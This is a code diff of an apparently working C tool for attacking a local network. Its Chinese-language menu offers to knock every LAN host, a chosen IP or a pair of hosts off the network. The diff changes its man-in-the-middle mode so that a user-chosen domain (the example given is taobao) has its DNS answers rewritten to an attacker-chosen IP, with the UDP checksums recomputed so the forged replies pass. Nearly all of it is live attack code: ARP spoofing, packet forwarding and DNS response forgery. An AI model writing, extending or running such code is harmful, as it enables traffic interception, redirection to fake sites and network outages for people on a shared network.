@@ -58,7 +58,7 @@ int two()
 	printf("[1]局域网所有主机断网.\n");
 	printf("[2]指定IP断网.\n");
 	printf("[3]断开两台主机..\n");
-	printf(".................................  ");
+	printf(".....................................  ");
 	printf("选择功能:");
 	int option;
 	scanf("%d",&option);
@@ -89,7 +89,7 @@ int two()
 	{
 		char p[20];
 		unsigned char mac[6];
-		printf("...................................  ");
+		printf(".......................................  ");
 		printf("目标ip:");
 		scanf("%s",p);
 		int i;
@@ -114,11 +114,11 @@ int two()
 	{
 		char p[20];
 		unsigned char mac[6];
-		printf("...................................  ");
+		printf(".......................................  ");
 		printf("目标IP1:");
 		scanf("%s",p);
 		int srcip = inet_addr(p);
-		printf("...................................  ");
+		printf(".......................................  ");
 		printf("目标IP2:");
 		scanf("%s",p);
 		int i;
@@ -183,11 +183,21 @@ static void *p_send_data(void *data)
 int three()
 {	
 	char target_ip[20]={0};
-	printf("...................................  ");
+	char hijack_domain[20]={0};
+    char redirect_ip[20]={0};
+
+	printf(".......................................  ");
 	printf("目标IP:");
 	scanf("%s",target_ip);
+
+	printf("...劫持域名(如www.taobao.com，则输入taobao即可):");
+	scanf("%s",hijack_domain);
+
+	printf(".....................................  ");
+	printf("重定向IP:");
+	scanf("%s",redirect_ip);
+
 	int dstip = inet_addr(target_ip);
-	// unsigned char *dst_host = (unsigned char *)&dstip;
 	unsigned char localmac[6],dstmac[6],gatewaymac[6];
 
 	getlocalmac(localmac);
@@ -241,8 +251,9 @@ int three()
     _dns_port = htons(dns);
     
     int send_enable = 1;
-    char *Hdn[100] = {"taobao", NULL, "bdimg", "bdstatic", NULL};
+    //char *Hdn[100] = {"taobao", NULL, "bdimg", "bdstatic", NULL};
     //char *Hdn[100] = {"baidu", "bdimg", "bdstatic", NULL};
+    char *Hdn[100] = {hijack_domain};
     u8 DNS_response_pack[1000]={0};
 	while(1)
 	{
@@ -250,106 +261,91 @@ int three()
         
         ip_datagram *ip = (ip_datagram *)recv_buff;
         
-        /* 收到目标主机发送至网关的数据帧 */
-        if(ip->iphdr.srcip == dstip)
+        /* 收到目标主机发送至网关的数据帧 只转发ip协议数据 */
+        if((ip->iphdr.srcip == dstip) && (ip->ethhdr.type == _ipv4))
         {
-	        if(ip->ethhdr.type == _ipv4)/* 只转发ip协议数据 */
-	        {
-                memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中源mac地址为本机mac，目标mac为网关mac */
-                memcpy(ip->ethhdr.src,localmac,6);
-                if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
-                {
-                    perror("send error");
-                } 
-	        }
+            memcpy(ip->ethhdr.dst,gatewaymac,6);/* 修改数据包中源mac地址为本机mac，目标mac为网关mac */
+            memcpy(ip->ethhdr.src,localmac,6);
+            if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
+            {
+                perror("send error");
+            }
         }
         
         /* 收到网关发送至目标主机的数据帧 */
         if(ip->iphdr.dstip == dstip)
         {
-            if(ip->ethhdr.type == _ipv4)
+        	udp_datagram *udp = (udp_datagram *)recv_buff;
+            if((ip->ethhdr.type == _ipv4) && (ip->iphdr.protocol == udp_prot) && (udp->udphdr.srcport == _dns_port)) /* dns */
 	        {
-                if(ip->iphdr.protocol == udp_prot) /* UDP */
+            	/* 解析主机访问的域名 */
+                char domain[100] = {0};
+                dns_datagram *dnsframe = (dns_datagram *)recv_buff;
+                int length_1 = (int)dnsframe->domain[0];
+                char *p = dnsframe->domain;
+                p = p + 1 + length_1;
+                int length_2 = (int)*p;
+                p++;
+                memcpy(domain, p, length_2);
+                printf("%s\n",domain);
+                
+                /* 计算问题数用总字节数，即域名部分占用的总字节数，后面修改IP地址时需要用到 */
+                p = dnsframe->domain;
+                int question_length = 0;
+                while(*p != 0)
                 {
-                    udp_datagram *udp = (udp_datagram *)recv_buff;
-                    if(udp->udphdr.srcport == _dns_port) /* DNS服务 */
-                    {
-                    	/* 解析主机访问的域名 */
-                        char domain[100] = {0};
-                        dns_datagram *dnsframe = (dns_datagram *)recv_buff;
-                        int length_1 = (int)dnsframe->domain[0];
-                        char *p = dnsframe->domain;
-                        p = p + 1 + length_1;
-                        int length_2 = (int)*p;
-                        p++;
-                        memcpy(domain, p, length_2);
-                        printf("%s\n",domain);
-                        
-                        /* 计算问题数用总字节数，即域名部分占用的总字节数，后面修改IP地址时需要用到 */
-                        p = dnsframe->domain;
-                        int question_length = 0;
-                        while(*p != 0)
-                        {
-                            question_length += 1;
-                            p++;
-                        }
-
-                        question_length += 5;/*0x00 1byte 查询类型 查询类 4byte */
-                        
-                        int answernum = ntohs(dnsframe->answer_rrs); /* 服务器回答的数量 */
-                        
-                        int i = 0;
-                        while(Hdn[i] != NULL)
-                        {
-                        	if(0 == strcmp(domain, Hdn[i])) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
-                        	{
-                                /* 修改的内容有：1.服务器响应IP */
-                                /*               2.重新计算udp校验和，不然目标主机发现校验和是错误的将会丢弃该数据包*/
-                                /* 1.修改服务器响应的IP地址，改成我们自己的服务器地址， 在服务器回答的内容找到类型是*/
-                                /*   0x0001的内容，此类型里面包含了响应的IP地址*/
-                                u8 *answer_c = (u8 *)(dnsframe->domain+question_length);
-                        		while(answernum)
-                                {
-                                    answernum--;
-                                    dns_answer *answer = (dns_answer *)answer_c;
-                                    if(answer->type == htons(0x0001))/* 若响应类型是IPV4地址，则更改，DNS协议 */
-                                    {
-                                        answer->ipaddr = inet_addr("192.168.1.109"); 
-                                    }
-                                    answer_c = answer_c + 12 + ntohs(answer->datalength);
-                                }
-                                
-                                /* 计算UDP校验和，udp校验和需要包含3部分：1.udp伪首部 */
-                                /*                                        2.udp首部*/
-                                /*                                        3.udp数据部分*/
-                                /* 1.udp伪首部 */
-                                udp_whdr whdr;
-                                memset(&whdr, 0xaa, sizeof(whdr));
-                                whdr.srcip = ip->iphdr.srcip;
-                                whdr.dstip = ip->iphdr.dstip;
-                                whdr.zero = 0;
-                                whdr.protocol = 0x11;
-                                whdr.length = htons(recv_size-sizeof(ip_datagram));
-                                
-                                /* 2.udp首部 */
-                                memcpy(&(whdr.udphdr.srcport), &(dnsframe->udphdr.srcport), sizeof(udp_header));
-                                
-                                /* 3.udp数据部分 */
-                                memcpy(whdr.udpdata, &(dnsframe->transactionid), recv_size-sizeof(udp_datagram));
-                                
-                                /* 计算之前需要将首部里面的校验和清零 */
-                                whdr.udphdr.check_sum = 0;
-                                
-                                /* 将原数据包中的检验和覆盖成新的校验和 */
-                                dnsframe->udphdr.check_sum = check_sum((u16 *)&whdr,\
-                                recv_size-sizeof(ip_datagram) + 12); /* +12是因为有12字节的udp伪首部 */
-
-                                break;
-                        	}
-                        	i++;
-                        }
-                    }
+                    question_length += 1;
+                    p++;
                 }
+
+                question_length += 5;/*0x00 1byte 查询类型 查询类 4byte */
+                
+                int answernum = ntohs(dnsframe->answer_rrs); /* 服务器回答的数量 */
+                
+                int i = 0;
+            	if(0 == strcmp(domain, hijack_domain)) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
+            	{
+                    /* 修改的内容有：1.服务器响应IP */
+                    /*               2.重新计算udp校验和，不然目标主机发现校验和是错误的将会丢弃该数据包*/
+                    /* 1.修改服务器响应的IP地址，改成我们自己的服务器地址， 在服务器回答的内容找到类型是*/
+                    /*   0x0001的内容，此类型里面包含了响应的IP地址*/
+                    u8 *answer_c = (u8 *)(dnsframe->domain+question_length);
+            		while(answernum)
+                    {
+                        answernum--;
+                        dns_answer *answer = (dns_answer *)answer_c;
+                        if(answer->type == htons(0x0001))/* 若响应类型是IPV4地址，则更改，DNS协议 */
+                        {
+                            answer->ipaddr = inet_addr(redirect_ip); 
+                        }
+                        answer_c = answer_c + 12 + ntohs(answer->datalength);
+                    }
+                    
+                    /* 计算UDP校验和，udp校验和需要包含3部分：1.udp伪首部 */
+                    /*                                        2.udp首部*/
+                    /*                                        3.udp数据部分*/
+                    /* 1.udp伪首部 */
+                    udp_whdr whdr;
+                    memset(&whdr, 0xaa, sizeof(whdr));
+                    whdr.srcip = ip->iphdr.srcip;
+                    whdr.dstip = ip->iphdr.dstip;
+                    whdr.zero = 0;
+                    whdr.protocol = 0x11;
+                    whdr.length = htons(recv_size-sizeof(ip_datagram));
+                    
+                    /* 2.udp首部 */
+                    memcpy(&(whdr.udphdr.srcport), &(dnsframe->udphdr.srcport), sizeof(udp_header));
+                    
+                    /* 3.udp数据部分 */
+                    memcpy(whdr.udpdata, &(dnsframe->transactionid), recv_size-sizeof(udp_datagram));
+                    
+                    /* 计算之前需要将首部里面的校验和清零 */
+                    whdr.udphdr.check_sum = 0;
+                    
+                    /* 将原数据包中的检验和覆盖成新的校验和 */
+                    dnsframe->udphdr.check_sum = check_sum((u16 *)&whdr,\
+                    recv_size-sizeof(ip_datagram) + 12); /* +12是因为有12字节的udp伪首部 */
+            	}
 	        }   
             memcpy(ip->ethhdr.dst,dstmac,6);
             memcpy(ip->ethhdr.src,localmac,6);
@@ -366,7 +362,7 @@ int three()
 int four()
 {
 	char target_ip[20]={0};
-	printf("...................................  ");
+	printf(".......................................  ");
 	printf("目标IP:");
 	scanf("%s",target_ip);
 	int dstip = inet_addr(target_ip);
